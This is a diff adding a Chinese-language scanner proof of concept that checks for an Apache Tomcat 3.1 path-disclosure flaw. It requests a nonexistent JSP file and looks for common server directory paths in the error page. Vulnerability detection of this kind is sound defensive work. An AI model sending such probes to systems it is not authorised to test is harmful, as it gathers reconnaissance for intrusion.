@@ -1,0 +1,30 @@
+[info]
+author = "AVE"
+description = "Apache Tomcat 3.1 在处理不存在的 URL 请求时，返回的错误页中包含服务器文件系统物理路径信息。通过请求一个不存在的资源路径，可以触发路径泄露，获取服务器目录结构信息。"
+id = "POC-AVE-2000-0579"
+name = "Apache Tomcat 3.1 路径信息泄露漏洞 PoC"
+severity = "medium"
+tags = ["ave-2000-0579"]
+vuln_id = [
+    "CVE-2000-0759",
+    "AVE-2000-0579",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/nonexistent12345.jsp"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "/usr/local",
+    "/opt/",
+    "/var/",
+    "/home/",
+]
